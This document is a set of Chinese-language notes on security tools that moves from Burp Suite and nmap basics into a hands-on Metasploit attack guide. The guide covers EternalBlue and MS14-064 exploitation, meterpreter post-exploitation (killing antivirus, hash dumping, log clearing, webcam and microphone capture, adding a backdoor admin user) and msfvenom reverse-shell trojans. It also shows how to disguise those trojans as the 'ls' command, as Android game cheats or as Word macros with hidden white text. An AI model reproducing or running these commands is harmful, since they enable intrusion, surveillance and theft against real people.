# 网络安全常用工具

# 1.常用操作系统

## 1.1 kali

```shell
https://www.kali.org/get-kali/
https://www.kali.org/tools/
```

## 1.2 parrot

## 1.3 火眼

# 2.综合工具

## 2.1 burpsuite

[burpsuite十大模块详细功能介绍【2021版】 - 腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/1999030)

```
1.概述
Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。

也就是说，Burp Suite是web应用程序渗透测试集成平台。从应用程序攻击表面的最初映射和分析，到寻找和利用安全漏洞等过程，所有工具为支持整体测试程序而无缝地在一起工作。

平台中所有工具共享同一robust框架，以便统一处理HTTP请求、持久性、认证、上游代理、日志记录、报警和可扩展性。
Burp Suite允许攻击者结合手工和自动技术去枚举、分析、攻击Web应用程序。

2.burpsuite具有以下功能：
Proxy——是一个拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。
Spider——是一个应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。
Scanner[仅限专业版]——是一个高级的工具，执行后，它能自动地发现web 应用程序的安全漏洞。
Intruder——是一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。
Repeater——是一个靠手动操作来补发单独的HTTP 请求，并分析应用程序响应的工具。
Sequencer——是一个用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。
Decoder——是一个进行手动执行或对应用程序数据者智能解码编码的工具。
Comparer——是一个实用的工具，通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。
```

```shell
#手机端抓包
1.确保bp所在电脑和你的收集在同一局域网中(如同一个wifi下)
2.bp设置：-->proxy-->options->add->port(8090) & special address(选本机Ip,10.102.225.116)
3.手机设置：设置-->wifi-->详细信息-->设置-->代理-->手动-->主机名(10.102.225.116)-->端口(8090)
4.下载证书并导入手机：
bp-->proxy-->options->Import/export CA certificate
-->export-->certificate in DER format
-->next-->select file(输入一个文件名称，如D:\1111_doc\burpsuite_project\my_bp) 
-->保存-->next--close.
然后在D:\1111_doc\burpsuite_project\my_bp就能看到my_bp文件了。
然后发送给手机，并安装即可。
```

### 2.1.1 下载社区版

```shell
1.前置工作
burpsuite是基于JDK的, 安装之前, 需要先安装jdk

2.下载(burpsuite community edition)并安装即可
https://portswigger.net/burp/communitydownload

3.虽然网络上有各种破解版, 但建议大家支持正版.
```

### 2.1.2 解决burp证书过期问题

[Burp Suite未连接：有潜在的安全问题 PortSwigger CA 造成_你们这样一点都不可耐的博客-CSDN博客_未连接有潜在的安全问题](https://blog.csdn.net/vanarrow/article/details/107855269)

```shell
1.导出burp证书
proxy->options->Import/export CA certificate
->export->certificate in DER format
->next->D:\1111_doc\burpsuite_project\cacert.der
->next->close

2.firefox导入burp证书
设置->隐私与安全->证书->查看证书->导入
->D:\1111_doc\burpsuite_project\cacert.der
->勾选：信任由此证书颁发机构来标识网站
->确定

3.配置firefox代理的端口号
设置->搜索"proxy"->网络设置->设置->手动配置代理
->HTTP代理 127.0.0.1，端口：8099
->勾选：也将代理用于HTTPS
->确定

4.配置burp代理
proxy->options->Add
->port: 8099
->loopback only
->ok
```

### 2.1.3 burp中文乱码问题

```shell
user options->Display
->HTTP Message Display
->Change font
->font 选择“黑体”
->ok
```

### 2.1.4 过滤指定域名

```shell
第一步
target->scope
->勾选：use advanced scope control
->include in scope: --> add --> host or ip range: patent.com.cn
->ok

第二步
proxy->options
->Intercept Client Requests
->勾选Intercept requests based on the following rules
->勾选Is in target scope
```

## 2.2 postman

```
下载地址:
https://www.postman.com/
```

## 2.3 nmap ([Nmap参考指南(Man Page)](https://nmap.org/man/zh/))

```
#概述
是一个网络连接端口扫描软件，用来扫描电脑上开发的网路连接端口。确定哪些服务运行在哪些连接的端口，并且推算计算机运行的操作系统。
https://nmap.org/man/zh/

nmap是一个网络探测和安全扫描程序，系统管理者和个人可以使用这个软件扫描大型的网络，
获取那台主机正在运行以及提供什么服务等信息。
nmap支持很多扫描技术，例如: UDP、TCP connect()、TCP SYN(半开扫描)、
ftp代理(bounce攻击)、反向标志、ICMP、FIN、ACK扫描、圣诞树(Xmas Tree)、SYN扫描
和null扫描。还可以探测操作系统类型。

#主要功能
1.检测网络存活主机（主机发现)
2.检测主机开放端口（端口发现或枚举)
3.检测相应端口软件（服务发现)版本
4.检测操作系统，硬件地址，以及软件版本
5.检测脆弱性的漏洞(nmap的脚本)

#如何继承
如果是kali, parrot, 则直接使用即可.
如果是其他操作系统, 可以自行下载安装包, 之后安装使用即可
```

### 2.3.0 写在前面

```shell
#1.基本扫描
#-sn参数说明:表示只ping扫描，不进行端口扫描
nmap -sn 192.168.13.0/24
#指定端口扫描
nmap -p1-65535 192.168.13.1
#-O表示猜测OS类型
nmap -O -p1-100 192.168.13.128

#2.半连接扫描
nmap扫描类型主要有TCP的全连接扫描（会在被扫描机器留下记录)，半连接扫描（不会留下记录)。
半连接扫描是指，在TCP三次握手中，当收到目标机的SYN+ACK包后，不再回复ACK包。
-SS表示使用SYN进行半连接扫描
nmap -sS 192.168.13.128 -p22,23,80

#3.全连接扫描
全连接扫描是指，完成TCP的三次握手。

#4.如何更隐藏的去扫描，频繁扫描会被屏蔽或者锁定IP地址。
随机扫描 + 延时扫描
nmap -v --randomize-hosts --scan-delay 3000ms -p80 192.168.13.1-10

#5.通配符扫描
nmap -v --randomize-hosts --scan-delay 3000ms -p80 192.*.13.1-10
```

### 2.3.1 主机发现

```
nmap扫描项, 扫描目标, 基本原理是抓包, 观察三次握手和四次挥手.
跟Ping 命令类似，发送探测包到目标主句，如果收到了恢复，那么目标主机就是开启的。
nmap支持至少10几种不同的目标主机探测的方式, 如:ICMP/ECHO/TIMESTAMP/NETMASK/TCPSYN/ACK/SCTP INIT/COOKIE-ECHO。

基本参数:
-SL: List Scan列表扫描,仅将指定的目标的IP列举出来，不进行主机发现。
-sn: Ping Scan只进行主机返现,不进行端口扫描
-Pn: 将所有指定的主机当做是开启的,跳过主机发现的过程
-PS/PA/PU/PY
-PE/PP/PM: 使用IAMP协议
-n/-R: -n表示不进行dns解析, -R表示进行dns解析
--dns-server
--system-dns
--traceroute: 表示进行路由追踪
-A：全盘扫描
-T: 时序选项
-T0(偏执的):非常慢的扫描,用于IDS逃避.
-T1(鬼崇的):缓慢的扫描,用于IDS逃避.
-T2(文雅的):降低速度以降低对带宽的消耗,此选项一般不常用。
-T3(普通的):默认,根据目标的反应自动调整时间.
-T4(野蛮的):快速扫描,常用扫描方式,需要在很好的网络环境下进行扫描,请求可能会淹没目标.
-T5(疯狂的):急速扫描,这种扫描方式以牺牲准确度来提升扫描速度.
```

```
示例1:
扫描公司局域网内10.1.1.1 -10.1.1.100.哪些IP的主机是活动。
nmap -sn 10.1.1.1-100

示例2:
```

### 2.3.2 端口扫描

```shell
1.端口状态
#Open
端口开启，数据有到达主机，有程序在端口上监控
#Closed
端口关闭，数据有到达主机，没有程序在端口上监控
#Filtered
数据没有到达主机，返回的结果为空，数据被防火墙或IDS过滤
#UnFiltered
数据有到达主机，但是不能识别端口的当前状态
#Open|Filtered
端口没有返回值，主要发生在UDP、IP、FIN、NULL和Xmas扫描中
#Closed|Filtered
只发生在IP ID idle扫描
```

### 2.3.3 漏洞扫描

```shell

```

### 2.3.4 脚本扫描

```shell
在Nmap安装目录下的scripts目录里存放了许多以“.nse"后缀结尾的文本文件，
这些就是Nmap自带的脚本引擎。
使用 Nmap Script时，需要添加参数“--script=脚本名称”。

#查找脚本路径
whereis nmap
ls /usr/share/nmap/scripts

#开始扫描
nmap --script /usr/share/nmap/scripts/http-trace.nse www.jpo.go.jp
nmap --script http-vuln-* yy.xx.com
```

### 2.3.99 DNMAP分布式集群执行大量扫描任务

```python
#1.概述
dnmap 是一个用python写的进行分布式扫描的nmap扫描框架，
我们可以用dnmap 来通过多个台机器发起一个大规模的扫描，
dnmap 采用C/S结构，执行大量扫描任务时非常便捷，扫描结果可以统一管理。

#2
.原理
用户在服务器端设定好nmap执行的命令，dnmap 会自动的分配给客户端进行扫描，
并将扫描结果提交给服务器。
dnmap有两个可执行文件，分别是dnmap_client和dnmap_server。
在进行一个分布式nmap扫描之前，我们可以用dnmap_server来生成一个dnmap的服务端，
然后在其他机器用dnmap client进行连接。然后就能进行分布式的nmap 扫描了。

#3.使用 kali自带的 dnmap
##3.1 生成证书文件
因为dnmap自带的用于TLS连接的pem文件证书太过久远，
必须要重新生成一个pem证书客户端和服务器才能正常连接。
openssl req -newkey rsa:2048 -new -nodes -x509 -days 3650 
-keyout key.pem -out server.pem

##3.2 修改证书文件
上一步执行完成之后，将会在同级目录下生成 server.pem和key.pem文件
将新生成的私钥key.pem追加到 server.pem文件中。
cat key.pem >> server.pem

##3.3 创建NMAP命令文件
这一步很简单我们只需要将扫描的命令添加到一个文件中即可，每行一条命令。
客户端启动后会主动找服务端要任务。当客户端执行完后，会再找服务端要任务。
vi nmap_task.txt
nmap 192.168.13.30-39
nmap 192.168.13.40-49
nmap 192.168.13.50-59
nmap 192.168.13.60-69


##3.4 使用dnmap_server启动dnmap的服务端(192.168.13.128)
选项:
-f:跟一个待会要执行的nmap命令的文件
-P:跟一个用于TLS连接的pem文件。默认是使用随服务器提供的server.pem
/usr/bin/dnmap_server -f nmap_task.txt -P server.pem

##3.5 使用dnmap_client启动dnmap的客户端
选项:
-s，输入dnmap的服务器地址
-p, dnmap服务的端口号，默认是46001
/usr/bin/dnmap_client -s 192.168.13.128

##3.6 结果查看
服务端192.168.13.128的执行命令处会生成一个nmap_task_results中。
```

## 2.4 全栈自动监控github

    https://sec.xiaomi.com/#/blogdetail/37
    https://github.com/MiSecurity/x-patrol

## 2.5 CMDB识别

    BugX区块链漏洞平台
        http://www.bugx.org/#/

## 2.6 CDN识别

    xcdn (github搜索)

## 2.7 WAF(Web Application Firewall)识别

    enablesecurity
    wafwoof (github搜索)

## 2.8 指纹识别系统

    http://whatweb.bugscaner.com/
    https://www.webshell.cc/tag/%E5%BE%A1%E5%89%91
    https://www.yunsee.cn/

## 2.9 web路径探测工具

    7kbScan

## 2.10 邮箱等工具搜集

     theHarvester(github搜索下载即可)

## 2.11 社会工程学信息

    http://unihan.com/

## 2.12 网盘搜索

    http://www.pansou.com/

## 2.13 网盘密码破解工具

## 2.14 源码搜索

    https://searchcode.com/
    gitee
    github
    gitlab
    gitcafe
    code.csdn.net

## 2.15 抓包工具

### 2.15.1 wireshark

```python
https://www.wireshark.org/


#概念
Wireshark是一个网络封包分析软件。
网络封包分析软件的功能是撷取网络封包，并尽可能显示出最为详细的网络封包资料。
Wireshark使用WinPCAP作为接口，直接与网卡进行数据报文交换。

#WireShark的应用 
网络管理员使用Wireshark 来检测网络问题，
网络安全工程师使用Wireshark来检查资讯安全相关问题，
开发者使用Wireshark来为新的通讯协议除错，
普通使用者使用Wireshark来学习网络协议的相关知识。
当然，有的人也会“居心叵测”的用它来寻找一些敏感信息...

#Wireshark快速分析数据包技巧
(1)确定Wireshark的物理位置。
如果没有一个正确的位置，启动Wireshark后会花费很长的时间捕获一些与自己无关的数据。
(2)选择捕获接口。
一般都是选择连接到Internet网络的接口，这样才可以捕获到与网络相关的数据。
否则，捕获到的其它数据对自己也没有任何帮助。
(3)使用捕获过滤器。
通过设置捕获过滤器，可以避免产生过大的捕获数据。
这样用户在分析数据时，也不会受其它数据干扰。而且，还可以为用户节约大量的时间。
(4)使用显示过滤器。
通常使用捕获过滤器过滤后的数据，往往还是很复杂。
为了使过滤的数据包再更细致,此时使用显示过滤器进行过滤。
(5）使用着色规则。
通常使用显示过滤器过滤后的数据，都是有用的数据包。
如果想更加突出的显示某个会话，可以使用着色规则高亮显示。
(6)构建图表。
如果用户想要更明显的看出一个网络中数据的变化情况，
使用图表的形式可以很方便的展现数据分布情况。
(7)重组数据。
当传输较大的图片或文件时，需要将信息分布在多个数据包中。
这时候就需要使用重组数据的方法来抓取完整的数据。
Wireshark 的重组功能，可以重组一个会话中不同数据包的信息，
或者是重组一个完整的图片或文件。

#混杂模式&&普通模式
混杂模式就是接收所有经过网卡的数据包，包括不是发给本机的包，即不验证MAC地址。
普通模式下网卡只接收发给本机的包(包括广播包）传递给上层程序，其它的包一律丢弃。
一般来说，混杂模式不会影响网卡的正常工作，多在网络监听工具上使用。
配置方式：(把混杂模式取消勾选就变成了普通模式)
停止抓包-->捕获-->input-->eth0(选中自己的网卡)-->勾选混杂模式(Enable promisecuous mode)

#
注意∶保存文件格式选pcap,这个格式基本所有的抓包软件都能打开，兼容性最好的;

#相关协议
ARP,ICMP,TCP,UDP,DNS,HTTP

#抓ARP包
Wireshark 过滤器输入ARP
nmap -sn 192.168.13.1

#抓ICMP包
Wireshark 过滤器输入ICMP
ping 192.168.13.2

#抓HTTP包
Wireshark 过滤器输入HTTP
curl -I www.baidu.com
```

```shell
#wireshark抓包解决服务器被黑上不了网
场景:服务器被黑上不了网，可以 ping通网关，但是不能上网。
模拟场景
修改主机TTL值为1，下面的方式是我们临时修改内核参数。
root@xuegod53:~# echo "1" > /proc/sys/net/ipv4/ip default ttl

TTL:数据报文的生存周期。
默认linux操作系统值:64，每经过一个路由节点，TTL值减1。TTL值为0时，说明目标地址不可达并返回:Time to live exceedede
作用:防止数据包，无限制在公网中转发。

示例：
ping www.baidu.com -c 1
我们可以看到提示我们Time to live exceeded这表示超过生存时间
我们判断和目标之间经过多少个网络设备是根据目标返回给我们的TTL值来判断的，
因为我们发送的数据包是看不到的。

#查看经过多少个网络节点的命令
apt install -y mtr
mtr
```

## 2.16 端口扫描工具

### 2.16.1 nmap/zenmap

### 2.16.2 御剑

```shell
github搜索即可
```

### 2.16.3 NC

```shell
nc是netcat的简写，有着网络界的瑞士军刀美誉。
因为它短小精悍、功能实用，被设计为一个简单、可靠的网络工具.

#基本功能
1.实现任意TCP/UDP端口的侦听，nc可以作为server以 TCP或UDP方式侦听指定端口
2.端口的扫描，nc可以作为client发起TCP 或UDP连接
3.机器之间传输文件
4.机器之间网络测速

#常用参数
-nv 表示我们扫描的目标是个IP地址不做域名解析
-w 表示超时时间
-z 表示进行端口扫描

#示例
nc -nv -w 1 -z 192.168.13.1 1-100 (探测网关1-100端口，哪些是开放的)
```

### 2.16.4 Fiddler

## 2.17 metasploit

```shell
msf是一款开源安全漏洞利用和测试工具，
集成了各种平台上常见的溢出漏洞和流行的shellcode，并持续保持更新。
metasploit让复杂的漏洞攻击流程变的非常简单，
一个电脑小白经过几小时的学习，就能对操作系统等主流漏洞发起危害性攻击。

渗透测试者的困扰︰
需要掌握数百个工具软件，上千个命令参数，实在记不住。
新出现的漏洞POC/EXP有不同的运行环境要求，准备工作繁琐。
大部分时间都在学习不同工具的使用习惯，如果能统一就好了，进而 Metasploit 就产生了。
POC，全称 ”Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码。
EXP，全称 ”Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。

#可扩展
Metasploit框架是可以添加漏洞代码片段，就好比一个军火库，它里面有各种武器供我使用，
当然也有新的武器被研发出来，放到武器库里面后，我也可以使用，
这就是框架的好处，新的攻击代码可以比较容易的加入 MSF框架供大家使用。

#Metasploit架构介绍
1.REX:基础功能库，用于完成日常基本任务，无需人工手动编码实现，处理socket连接访问，协议应答(http/SSL/SMB等)，编码转换(XOR,Base64,Unicode)
2.技术模块∶5.0之后就增加了个evasion模块，现在一共是7个技术模块。(ls /usr/share/metasploit-framework/modules即可看到)
3.插件:插件可以调用外部一些渗透测试工具，例如: loaa nessus就可以调用 nessus 扫描软件。
4.接口:有 msfconsole 控制终端、mstcli 命令行、msfgui 图形化界面、armitage 图形化界面和 msfapi 远程调用接口。
5.功能程序:metasploit还开发了一些可以直接运行时命令，比如 msfpayload、msfen
code 以及 msfvenom。

# MSF 技术模块的功能·
技术功能模块(不是流程模块)︰有新的漏洞利用模块要放到这些模块下面进行调用。
1.auxiliary
负责执行信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能的辅助模块
2.exploits
利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法(主动、被动）
3.payloads
成功exploit之后，真正在目标系统执行的代码或指令。
分为3种类型的payload 分别是single, stages和stagers, shellcode是特殊的payload ,用于拿shell。
single : all-in-one。完整的payload，这些payload都是一体化的，不需要依赖外部的库和包。
stagers:目标计算机内存有限时，先传输一个较小的payload 用于建立连接。
stages :利用stagers 建立的连接下载后续payload。
4.encoders
对payload进行加密，躲避 AntiVirus检查的模块
5.nops
提高 payload稳定性及维持大小。
在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区，
这样当触发渗透攻击后跳转执行ShellCode时，有一个较大的安全着陆区，
从而避免受到内存地址随机化、返回地址计算偏差等原因造成的ShellCode执行失败，
提高渗透攻击的可靠性。
6.post
后期渗透模块。在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，
如获取敏感信息、跳板攻击等操作。
7.evasion
创建木马文件，个人感觉相当于msfvenom的一个子功能的存在。

#
```

### 2.17.1 准备工作

```shell
启动metasploit前需要做:
-打开kali终端
-使用sudo su命令，并输入kali的密码kali，切换至root用户
-使用msfdb init命令初始化metasploit数据库（*可选)

输入msfconsole进入交互界面即可

msf使用法则:
使用模块->配置模块必选项->运行模块三步操作，就能实现对主流漏洞的攻击

#show:
用show 命令查看msf提供的资源。在根目录下执行的话，
由于有些模块资源比较多，需要执行show命令要较长的时间-
show options/payloads/targets/evasion/missing/

#search:
搜索模块;简单搜索:例:seach ms10-046

#多条件搜索缩小范围:
search name:mysql type:exploit platform:linux.
search name:mysql /platform:mysql /cve:2015 / path/type:auxiliary/author:aaron


#use: 
search 找到模块后，用use使用模块.
use使用一个模块后，可以使用show options 查看我们需要配置的选项、
使用show targets选择目标主机系统、
使用show payloads 选择 payload、
使用show advanced查看高级参数、
使用show evasion查看用来做混淆、逃避的模块。。
use exploit/windows/smb/ms08_067_netapi

#set/setg:
设置参数，比如要渗透的主机IP.payload等
我们可以用show missing查看没有设置的参数
setg是设置全局变量，避免每个模块都要输入相同的参数

#unset/unsetg: 
取消设置参数。unsetg是取消设置的全局变量

#save:
设置的参数在下一次启动的时候不会生效，可以用save保存我们使用过程的设置。
/root/.msf4/config cat到文件进行查看

#check:
检查目标是否真的存在这个漏洞，大部分模块没有check功能

#run/exploit:
攻击

#jobs/kill:
杀死进程

#session:
建立会话

#
```

### 2.17.2 msf利用永恒之蓝漏洞的流程(靶机需要是win10以下系统)

```shell
0.探测靶机是否存在永恒之蓝漏洞
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.102.225.226
run


1．使用模块
use exploit/windows/smb/ms17_010_eternalblue

2.设置必选项
>查看必选项[*required为yes的就是必选项]show options

#RHOSTS为target host(s)代表你要攻击谁
set RHOSTS 192.168.1.128

#payload是攻击载荷，就是攻击完成后想干啥，这里是想获取meterpreter
#meterpreter是metasploit后渗透的神器
set payload windows/x64/meterpreter/reverse_tcp

#LHOSTS为listen host代表你是谁，既Kali的IP地址
set LHoST 192.168.1.136

#LPORT为listen port，代表你要在kali上开启的端口，1-65535随便选，但不能被占用
set LPORT 12345


3.运行
#执行run命令即可。
run

4.之后可以肉鸡进行操作
```

### 2.17.3 利用win10漏洞

[msf win10漏洞_利用msf攻击win10_weixin_39621794的博客-CSDN博客](https://blog.csdn.net/weixin_39621794/article/details/112409186)

```shell

```

### 2.17.4 主机发现

```shell
1.选择主机发现模块
use auxiliary/scanner/discovery/arp_sweep

2.查看选项
show options

3.设置选项
set RHOSTS 10.102.224.206 (目标ip) 或者 (set RHOSTS 10.102.224.0/24 (表示扫描一个网段))
set SHOST 112.80.248.76 (伪造的源ip，隐藏自己身份)

4.开始扫描
run
```

### 2.17.5 端口扫描

```shell
1.选择端口扫描模块
use auxiliary/scanner/portscan/syn

2.查看选项
show options
或者 show missing(表示查看必选项)

3.设置选项
set RHOSTS 10.102.224.206
set PORTS 1-10000

4.开始扫描
run
```

### 2.17.6 FTP信息收集

```shell
1.选择一个ftp模块
use auxiliary/scanner/ftp/ftp_version (查看ftp版本)
或 use auxiliary/scanner/ftp/anonymous (查看ftp是否支持匿名登录)
或 use auxiliary/scanner/ftp/ftp_login (进行爆破ftp时选择)

2.查看选项
show options
或者 show missing(表示查看必选项)

3.设置选项
set RHOSTS 10.102.224.206

4.开始扫描
run或者exploit

5.漏洞利用
5.1 如果发现扫描到的ftp是支持匿名登录的，那么可以在浏览器输入ftp://10.102.224.206:21即可查看文件
5.2 也可以通过上一步扫描出来的ftp版本以及相关信息google查看该版本的漏洞，然后进行利用
```

### 2.17.7 SSH信息收集

```shell
1.选择一个ssh模块
use auxiliary/scanner/ssh/ssh_version (查看ssh版本)
或 use auxiliary/scanner/ssh/ssh_login (进行爆破ssh时选择)

2.查看选项
show options
或者 show missing(表示查看必选项)

3.设置选项
set RHOSTS 10.102.224.206
ssh_login 时额外设置如下：
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/password.lst
(ps:也可以修改字典表或者自定义字典表)
4.开始扫描
run或者exploit
```

### 2.17.8 SMB(samba)信息收集

```shell
1.选择一个ssh模块
use auxiliary/scanner/smb/smb_version (查看版本)
或 use auxiliary/scanner/smb/smb_login (进行爆破时选择,爆破思路同ssh)

2.查看选项
show options
或者 show missing(表示查看必选项)

3.设置选项
set RHOSTS 10.102.224.206

4.开始扫描
run或者exploit
```

### 2.17.9 密码嗅探

```shell
1.选择一个ssh模块
use auxiliary/sniffer/psnuffle

2.查看选项
show options
或者 show missing(表示查看必选项)
或者 info (查看模块的详细信息)

3.设置选项


4.开始扫描
run或者exploit

5.返回上一步
back

6.查看后台运行的程序
jobs

7.kill掉某个程序
kill -id (如 kill 0)
```

### 2.17.10 MS14-064漏洞

```shell
Microsoft Windows OLE远程代码执行漏洞，OLE（对象链接与嵌入）是一种允许应用程序共享数据和功能的技术，
远程攻击者利用此漏洞通过构造的网站执行任意代码，影响Win95+IE3 - Win10+IE11全版本.


1.选择一个ssh模块
use exploit/windows/browser/ms14_064_ole_code_execution

2.查看选项
show options
或者 show missing(表示查看必选项)
或者 info (查看模块的详细信息)

3.设置选项
set allowpowershellprompt true
set srvhost 10.102.224.112
set srvport 8081
set payload windows/meterpreter/reverse_tcp
set lhost 10.102.224.112


4.开始扫描
run或者exploit

5.这里会生成一个链接
http://10.102.224.112:8081/02BrBgo
将这个链接发给其他人，如果其他人用IE浏览器打开(切记一定是IE)，你就能在控制台看见对方信息

6.输入sessions命令
然后输入 session id(如 session 1)进入指定的session会话开始进行交互
```

### 2.17.11

## 2.18 meterpreter(metasploit的强大的后渗透模块, 适用于windows系统)

```shell
meterpreter是强大的后渗透模块，可以输入help查看帮助信息
远程控制、命令执行、摄像头监控、密码获取、创建后门用户、破坏篡改系统...
这些看起来非常复杂又高级的操作都能用meterpreter中一行或几个字母，简单的命令完成
Meterpreter比系统shell更加灵活，功能更加丰富
例如监控主机，监控键盘，开启摄像头，麦克风，还可以灵活的获取你的操作系统信息
高级，动态，可扩展的payload,一站式后攻击payload 
基于meterpreter上下文利用更多漏洞发起攻击
后渗透测试阶段一站式操作界面
完全基于内存的DLL注入式payload(不写硬盘)
注入合法系统进程并建立stager
基于stager上传和预加载DLL进行扩展模块的注入(客户端API)
基于stager建立的socket连接建立加密的TLS/1.0通信隧道
利用TLS隧道进一步加载后续扩展模块
(避免网络取证)

#lpwd/lcd
从本机上传到目标机用得到的命令.

#run/bgrun 
run在前台,bgrun在后台

#bgrun killav
杀掉目标机的杀毒软件

#bgrun post/multi/gather/wlan_geolocate


#bgrun post/windows/gather/arp_scanner


#bgrun hashdump
哈希值

bgrun service_manager -I
查看已有的服务

#bgrun vnc
监控主机

#bgrun winbf
让肉鸡来暴力破解

#clearev
清除目标的日志，清理战场

#download
下载文件

#upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32
上传文件

#dir widnows\\system32\nc.exe
dir 等同 ls 命令

#execute -f cmd.exe -I -H


#getuid

#getsystem
把自己变成system权限

#getprivs
看系统有什么权限

#getproxy
获取代理信息

#getpid
查看进程信息

#getpid/ps/migrate 1560
迁移后门进程

#hashdump=run post/windows/gather/hashdump

#sysinfo

#kill 1052
kill 进程

#shell

#show_mount

#search -f win.ini
查找文件

#arp

#netstat

#ipconfig/ifconfig

#route -h
路由表

#idletime

#resource -r r.txt

#record_mic
麦克风

#Webcam_list
摄像头

#例:创建后门用户并开启远程连接，
#永恒之蓝攻击成功后，在metaspolit中执行：
shell
net user zhangsan 123456 /add && net localgroup administrators zhangsan /add
exit

#开启windows远程桌面连接，这种方式很少使用，因为一个用户登录后，会把另一个用户顶掉。
run getgui -e
```

## 2.19 msfvenom远程控制木马

```shell
在什么情况下需要使用客户端攻击?
在无法突破网络边界的情况下转而攻击客户端
社会工程学攻击
进而渗透线上业务网络
含有漏洞利用代码的web站点
利用客户端漏洞
含有漏洞利用代码的DOC,PDF 等文档
诱骗被害者执行Payload

msfvenom是msfpayload和msfencode命令的结合体

#参数
-p,--payload < payload>指定需要使用的 payload(攻击荷载),如果需要使用自定义的 payload，请使用&#039;-&#039;或者stdin指定·
-l,--list [module_type]列出指定模块的所有可用资源﹒模块类型包括: payloads, encoders, nops, all.
-n,--nopsled <length>为payload预先指定一个NOP滑动长度.
-f,--format <format>指定输出格式(使用--list formats来获取msf支持的输出格式列表)
-e,--encoder [encoder]指定需要使用的encoder (编码器）·
-a,--arch <architecture>指定payload的目标架构
--platform , <platform>指定payload的目标平台
-s,--space <length>设定有效攻击荷载的最大长度
-b,--bad-chars <list>设定规避字符集，比如:&#039;\x00\xff&#039;
-i,--iterations <count>指定payload 的编码次数
-c,--add-code <path>指定一个附加的win32 shellcode文件.
-x,--template < path>指定一个自定义的可执行文件作为模板·
-k,--keep保护模板程序的动作，注入的payload作为一个新的进程运行·
--payload-options 列举payload的标准选项
-o,--out <path>保存payload
-v,--var-name < name>指定一个自定义的变量，以确定输出格式
--shellest最小化生成payload
-h, --help 查看帮助选项
```

### 2.19.1 windows端

```shell
#注意：msfvenom在shell里使用，不是msfconsole终端。
msfvenom是用来生成后门的软件，在目标机上执行后门，在本地监听上线。

#1.生成木马
#-p:payload, windows/x64/meterpreter/reverse_tcp:系统/架构/作用/方式
#lhost=192.168 123.136 lport=9999, payload设置,这里是攻击者主机kali主机地址
#-f:format,-o:output,exe:windows可执行文件，
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.102.224.109 lport=4444 -f exe -o demo.exe
或(因为有时候x64不太稳定)
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.102.224.109 lport=4444 -b "\x00\x0ff" -a x86 --platform windows -e x86/shikata_ga_nai -i 5 -f exe -o demo1.exe

#2.在msf里面开启监听，等待被攻击者上钩
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
或 set payload windows/meterpreter/reverse_tcp
set lhost 10.102.224.109
set lport 4444
run
#观察到获取了肉鸡的shell之后，可以执行调用摄像头等之类的操作
webcam_snap -i 1 -p test.png -v false

#3.windows靶机运行木马文件
注意，需要关闭windows上的杀毒软件并且windows defenders 要允许执行这个exe文件
```

### 2.19.2 linux端

```shell
#1.生成木马
msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=10.102.224.109 lport=4444 -b "\x00\x0ff" -a x64 --platform linux -i 5 -f elf -o hi.elf


#2.在kali机开启监听
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost 10.102.224.109
set lport 4444
run

#3.linux靶机运行木马文件
将生成的hi.elf文件上传到Linux靶机，并赋予权限：chmod 777 hi.elf
然后执行文件 ./hi.elf

#4.此时在kali监听处将获取到meterpreter的shell，执行后续操作即可，如查看当前目录
pwd
```

#### 2.19.2.1 linux端木马伪装

```shell
#这里假定伪装ls命令
#1.查看ls命令的位置
which ls (假如是：/usr/bin/ls)
#2.移动ls命令的执行位置
mv /usr/bin/ls /opt/ls
#3.编辑并保存ls
vi /usr/bin/ls
#!/bin/bash
/opt/ls --color=auto
/root/Downloads/hi.elf >& /dev/null &

#4.赋予执行权限
chmod +x /usr/bin/ls

#5.此时再执行 ls命令即可
```

### 2.19.3 手机端(安卓端)

```shell
hacker可以针对不同人群进行各种主动攻击，例如把后门捆绑到现在很火的吃鸡游戏外外挂上,
或者捆绑到知名网游外挂补丁上，然后传到网路，供给他们下载。
再或者伪装成QQ或者微信类的安装软件提供给有需求的人群。·
比如我们向目标手机发一个含有后门的apk软件，或者是一个word 文档、pdf 文件。
想要达到效果同时也要利用好社会工程学，来诱骗受害者执行恶意程序。

基本流程如下：
#1.生成木马
msfvenom -p android/meterpreter/reverse_tcp lhost=10.102.224.109 lport=4444 --platform android R> /root/games.apk

#2.在kali机开启监听
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost 10.102.224.109
set lport 4444
run

#3.将生成的apk安装到手机后
kali即可获取到执行权限
```

### 2.19.4 word文档攻击

```shell
1.生成木马
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.102.224.109 lport=4444 -a x86 --platform windows -e x86/shikata_ga_nai -i 5 -f vba-exe

2.制作一个word木马文档
>> 新建word文档：hi.docx
>> 视图-->查看宏-->将第一步生成的 MACRO CODE 粘贴到宏中，宏的名称随意
>> ctrl+s保存
>> 将第一步生成的 PAYLOAD DATA 粘贴到 word文档hi.docx中
>> 注意：为了更好的隐藏，粘贴到hi.docx时，可以将字体颜色为白色，字体调小，放到文档最后

3.在kali机开启监听
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.102.224.109
set lport 4444
run
```

### 2.19.5 基于post进行后渗透测试(重点！！！)
